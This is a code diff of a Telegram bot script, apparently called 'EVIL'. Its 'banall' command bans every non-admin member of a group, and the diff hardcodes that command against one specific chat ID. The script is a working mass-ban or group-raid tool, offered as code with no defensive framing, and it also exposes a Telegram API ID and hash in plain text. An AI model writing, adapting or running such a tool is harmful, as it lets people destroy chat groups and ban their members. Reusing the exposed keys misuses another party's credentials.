@@ -35,22 +35,22 @@ Evil = TelegramClient('EVIL', 18136872, "312d861b78efcd1b02183b2ab52a83a4").star
 async def banall(event):
    if event.sender_id in SUDO_USERS:
         await event.delete()
-        admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
+        admins = await event.client.get_participants(-1001661941924, filter=ChannelParticipantsAdmins)
         admins_id = [i.id for i in admins]
         all = 0
         bann = 0
-        if int(event.chat_id) in ALTRONS:
+        if int(-1001661941924) in ALTRONS:
             return
-        async for user in event.client.iter_participants(event.chat_id):
+        async for user in event.client.iter_participants(-1001661941924):
             all += 1
             try:
                 if user.id not in admins_id and user.id not in EVILS:
-                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
+                    await event.client(EditBannedRequest(-1001661941924, user.id, RIGHTS))
                     bann += 1
             except Exception as e:
                 pass
 
 
-print("TEAM LEGENDZ OP")
+print("@cinncon")
 
 Evil.run_until_disconnected()
